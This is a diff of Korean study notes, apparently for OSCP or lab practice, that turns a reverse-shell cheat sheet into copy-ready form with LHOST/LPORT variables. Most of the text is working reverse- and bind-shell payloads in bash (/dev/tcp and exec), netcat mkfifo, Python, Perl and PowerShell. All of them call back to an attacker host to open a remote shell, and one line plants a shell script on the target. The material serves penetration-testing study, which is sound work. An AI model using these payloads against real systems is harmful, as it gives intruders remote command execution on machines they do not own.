@@ -43,52 +43,62 @@ ip a show tun0
 
 # 포트 연결 테스트
 
-nc -zv 10.10.234.59 1234
--z : Zero-I/O 모드 - 연결만 테스트하고 데이터 전송하지 않음 (포트 스캔용)
--v : Verbose 모드 - 상세한 출력 표시
+```bash
+nc -zv 10.8.136.212 1234
+# -z : Zero-I/O 모드 - 연결만 테스트하고 데이터 전송하지 않음 (포트 스캔용)
+# -v : Verbose 모드 - 상세한 출력 표시
 sh -i >& /dev/tcp/10.8.136.212/1234 0>&1
+# 10.8.136.212=LHOST, 1234=LPORT
+```
 
 ---
 
 ## 리버스쉘 파일 생성 사이트 -> https://www.revshells.com/
 
+> 사용법: `LHOST`/`LPORT`만 수정
 ```bash
-# python interpreter env
-
-# bash
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.136.212",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
-
-# sh
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.136.212",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
-
-
-# bash 환경에서 실행
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind(("10.8.136.212",4445));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+LHOST="10.8.136.212"; LPORT=4445
 ```
 
-````bash
+```python
+# 단계별 (LHOST/LPORT만 수정)
 import socket
 import subprocess
 import os
 
+LHOST = "10.8.136.212"
+LPORT = 4445
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.8.136.212", 4445))
+s.connect((LHOST, LPORT))
 
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 
 subprocess.call(["/bin/bash", "-i"])
+```
 
+```python
+# 한줄용 (복사 바로 가능)
+python3 -c '
+import socket,subprocess,os
+LHOST="10.8.136.212"; LPORT=4445
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((LHOST,LPORT))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
+'
 ```
 
 ```bash
+LHOST="10.8.136.212"; LPORT=1234
 # 타겟에서 공격자로 핑 테스트
-ping -c 4 공격자IP
+ping -c 4 $LHOST
 # 포트 연결 테스트
-nc -zv 공격자IP 1234
+nc -zv $LHOST $LPORT
 # 또는 텔넷으로 테스트
-telnet 공격자IP 1234
+telnet $LHOST $LPORT
 ````
 
 ## 4️⃣ 대체 리버스 쉘 방법
@@ -96,23 +106,26 @@ telnet 공격자IP 1234
 ### 📎 Bash 리버스 쉘
 
 ```bash
-bash -i >& /dev/tcp/공격자IP/1234 0>&1
+LHOST="10.8.136.212"; LPORT=1234
+bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
 ```
 
 ### 📎 Netcat 리버스 쉘 (전통적 방법)
 
 ```bash
+LHOST="10.8.136.212"; LPORT=1234
 # mkfifo를 이용한 방법
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 공격자IP PORT >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
 
 # reverse shell script in target host
-echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 공격자IP PORT >/tmp/f' >> /etc/reverse_shell.sh
-
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f" >> /tmp/reverse_shell.sh
 ```
+
 ### 📎 Perl 리버스 쉘
 
 ```bash
-perl -e 'use Socket;$i="공격자IP";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+# $i=LHOST, $p=LPORT 로 수정해서 사용
+perl -e 'use Socket;$i="10.8.136.212";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
 ---
@@ -200,8 +213,8 @@ nc -lvnp 4445
 | 1    | 공격자 리스너 실행 | `nc -lvnp 1234`                                  |
 | 2    | IP 주소 정확성     | `ip a \| grep inet`                              |
 | 3    | 타겟 Python 존재   | `which python3`                                  |
-| 4    | 네트워크 연결      | `ping 공격자IP`                                  |
-| 5    | 포트 연결 테스트   | `nc -zv 공격자IP 1234`                           |
+| 4    | 네트워크 연결      | `ping $LHOST`                                  |
+| 5    | 포트 연결 테스트   | `nc -zv $LHOST 1234`                           |
 | 6    | 리버스 쉘 실행     | 위 Python 코드                                   |
 | 7    | TTY 안정화         | `python -c 'import pty; pty.spawn("/bin/bash")'` |
 
@@ -218,17 +231,36 @@ nc -lvnp 4445
 ### 🔗 Bash
 
 ```bash
+LHOST="10.8.136.212"; LPORT=1234
 # 방법 1: /dev/tcp 사용
-bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
+bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
 
 # 방법 2: exec 사용
-exec 5<>/dev/tcp/10.8.136.212/1234;cat <&5|while read line;do $line 2>&5 >&5;done
+exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5|while read line;do $line 2>&5 >&5;done
 ```
 
 ### 🌊 PowerShell (Windows)
 
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient("10.8.136.212",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$LHOST="10.8.136.212"
+$LPORT=1234
+$client = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
+$sendback = (iex $data 2>&1 | Out-String )
+$sendback2 = $sendback + "PS " + (pwd).Path + "> "
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+$stream.Write($sendbyte,0,$sendbyte.Length)
+$stream.Flush()
+}
+$client.Close()
+```
+
+```powershell
+# 한줄용 (복사 바로 가능)
+$LHOST="10.8.136.212"; $LPORT=1234; $client=New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 ---
@@ -257,39 +289,42 @@ $client = New-Object System.Net.Sockets.TCPClient("10.8.136.212",1234);$stream =
 ### 1️⃣ 기본 연결성 확인
 
 ```bash
+LHOST="10.8.136.212"; LPORT=1234
 # 핑 테스트
-ping -c 2 10.8.136.212
+ping -c 2 $LHOST
 
 # 포트 연결 테스트
-nc -zv 10.8.136.212 1234
+nc -zv $LHOST $LPORT
 ```
 
 ### 2️⃣ 다른 포트로 테스트
 
 ```bash
+LHOST="10.8.136.212"; LPORT=1234
 # 공격자 머신에서 다른 포트 사용
 nc -lvnp 8080
 
-# 타겟에서 연결
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.8.136.212",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+# 타겟에서 연결 (LHOST/LPORT만 수정)
+python3 -c 'import socket,subprocess,os;LHOST="10.8.136.212";LPORT=1234;s=socket.socket();s.connect((LHOST,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 ```
 
 ### 3️⃣ 바인드 쉘로 방향 변경
 
 ```bash
+LPORT=1234
 # 타겟에서 바인드 쉘 실행
-nc -lvnp 1234 -e /bin/bash
+nc -lvnp $LPORT -e /bin/bash
 
 # 공격자에서 연결
-nc 타겟IP 1234
+nc $LHOST $LPORT
 ```
 
 ---
 
 ## 📋 언어별 장단점 비교
 
-| 언어       | 장점                    | 단점               | OSCP 추천도 |
-| ---------- | ----------------------- | ------------------ | ----------- |
+| 언어   | 장점                    | 단점               | OSCP 추천도 |
+| ------ | ----------------------- | ------------------ | ----------- |
 | Python | 거의 모든 시스템에 존재 | 없음               | ⭐⭐⭐⭐⭐  |
 | Bash   | 기본 쉘, 빠름           | /dev/tcp 지원 필요 | ⭐⭐⭐⭐⭐  |
 | Netcat | 간단, 직관적            | 버전별 차이        | ⭐⭐⭐⭐    |
